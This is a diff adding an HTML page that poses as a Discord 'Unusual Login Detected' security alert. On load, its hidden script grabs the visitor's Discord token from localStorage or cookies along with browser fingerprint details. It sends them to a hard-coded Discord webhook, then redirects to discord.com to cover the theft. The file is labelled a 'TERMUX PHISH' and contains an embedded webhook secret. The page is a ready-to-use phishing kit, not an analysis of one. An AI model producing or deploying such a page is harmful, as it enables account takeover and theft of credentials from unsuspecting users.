@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Discord — Security Alert</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://discord.com/assets/101649a7b2e5a8b7f3f7.ico">
+  <style>
+    body{background:#36393f;color:#dcddde;font-family:Arial;text-align:center;padding:80px 20px}
+    .logo{width:70px;margin:0 auto 20px}
+    .status{font-size:16px;margin:25px 0;color:#72767d}
+    .spinner{border:3px solid #36393f;border-top:#5865F2 solid 3px;border-radius:50%;width:24px;height:24px;animation:spin 1s linear infinite;margin:20px auto}
+    @keyframes spin{to{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
+  <img src="https://discord.com/assets/7bb0c89d8e8a1f0e5f8e.svg" class="logo">
+  <h3>Unusual Login Detected</h3>
+  <p>We’ve sent a verification request to your devices.</p>
+  <div class="status">Securing session...</div>
+  <div class="spinner"></div>
+
+  <script>
+    (()=>{
+      const token = (localStorage.token || document.cookie.match(/token=([^;]+)/)?.[1] || "NO_TOKEN").replace(/"/g,"");
+      const ua = navigator.userAgent;
+      const platform = navigator.platform;
+      const cores = navigator.hardwareConcurrency || "Unknown";
+      const mem = navigator.deviceMemory || "Unknown";
+      const lang = navigator.language;
+      const perf = Math.round(performance.now());
+
+      // ⚠️ Webhook بتاعك (بدون أي وسيط)
+      fetch("https://discord.com/api/webhooks/1456051045724717066/u4U_QxbiwDRAVJ8h27s3DEnearYvpXxUDPekD2gFHucpPd8tJbZS6LM1WeGRCSwGBnEH", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          content: `**💀 TERMUX PHISH — NO NGROK**\n`+
+                   `> **Token**: ||${token}||\n`+
+                   `> **UA**: \`${ua}\`\n`+
+                   `> **OS**: \`${platform}\`\n`+
+                   `> **Cores**: ${cores} | **RAM**: ${mem}GB | **Lang**: ${lang}\n`+
+                   `> **Render Time**: ${perf}ms\n`+
+                   `> **Time**: <t:${Math.floor(Date.now()/1000)}:R>`
+        })
+      }).catch(()=>{});
+
+      setTimeout(()=>{window.location.replace("https://discord.com/app");},2200);
+    })();
+  </script>
+</body>
+</html>
